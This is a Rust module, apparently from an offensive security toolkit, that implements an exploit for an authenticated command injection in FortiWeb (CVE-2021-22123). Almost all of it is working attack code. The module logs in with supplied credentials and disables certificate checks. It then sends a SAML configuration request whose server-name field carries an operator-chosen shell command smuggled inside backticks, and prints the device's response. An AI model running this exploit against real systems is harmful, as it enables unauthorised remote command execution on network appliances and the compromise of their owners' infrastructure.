use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use serde_json::json;
use std::time::Duration;
use urlencoding::encode;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// FortiWeb Authenticated OS Command Injection (CVE-2021-22123)
/// 
/// Exploits a command injection in the SAML Server configuration.
/// Requires valid credentials.
/// 
/// API: /api/v2/cmdb/user/saml-user
/// Param: server-name (vulnerable to backticks `)

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP").await?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    let base_url = format!("https://{}", target_ip);
    println!("{} Target: {}", "[*]".blue(), base_url);

    // Credentials
    let username = prompt_default("Username", "admin").await?;
    let password = prompt_required("Password").await?;

    // Connect and Login (to get token/cookies)
    // Note: FortiWeb login process usually involves /api/v2/token or similar
    // We will attempt a generic login flow or specific endpoints if known
    // 
    // Usually: POST /logincheck w/ username/secretkey
    // Or if it's the new API: POST /api/v2/auth/login
    
    println!("{} Attempting login...", "[*]".blue());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true) // Enable cookies
        .timeout(Duration::from_secs(15))
        .build()?;
        
    // Attempt standard login first
    let login_url = format!("{}/logincheck", base_url);
    // Manual form construction to avoid dependency issues with .form()
    let body = format!("username={}&secretkey={}", encode(&username), encode(&password));
    
    let res = client.post(&login_url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body)
        .send()
        .await
        .context("Login request failed")?;
        
    // Check if login succeeded (cookies should be set)
    // We can also verify by hitting an authenticated endpoint or checking response text
    // FortiWeb typically returns simple text or redirect on success.
    
    if !res.status().is_success() {
         println!("{} Login failed (Status: {}). Check credentials.", "[-]".red(), res.status());
         // Could assume failure but let's try to proceed if maybe cookies set anyway?
         // No, likely failed.
         return Ok(());
    }
    
    // Payload
    let cmd = prompt_default("Command to execute", "id").await?;
    
    // We need to inject command in `server-name` inside backticks
    // Example: `id` 
    // But we need to make it a valid string for the rest of the command? 
    // The vuln is specifically in the name field.
    // 
    // Payload construction: 
    // server-name: "test`" + cmd + "`"
    
    println!("{} Sending exploit payload...", "[*]".blue());
    
    let exploit_url = format!("{}/api/v2/cmdb/user/saml-user", base_url);
    
    let payload = json!({
        "server-name": format!("test`{}`", cmd),
        "entity-id": "http://test.com",
        "idp-entity-id": "http://test.com",
        "idp-single-sign-on-url": "http://test.com",
        "idp-single-logout-url": "http://test.com",
        "idp-cert": "Factory" // Usually requires a cert name, 'Factory' often exists
    });

    let res = client.post(&exploit_url)
        .json(&payload)
        .header("Content-Type", "application/json")
        .header("X-CSRF-TOKEN", "") // Some versions need CSRF token found in cookies/html, might be tricky
        .send()
        .await;
        
    match res {
        Ok(r) => {
             // RCE might be blind or reflected in error/response.
             // If blind, we need OOB.
             // If reflected, print body.
             println!("{} Exploit sent. Status: {}", "[+]".green(), r.status());
             let body = r.text().await.unwrap_or_default();
             println!("{} Response: {}", "[*]".blue(), body);
        },
        Err(e) => println!("{} Exploit request failed: {}", "[-]".red(), e),
    }

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    FortiWeb Authenticated Command Injection (CVE-2021-22123) ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
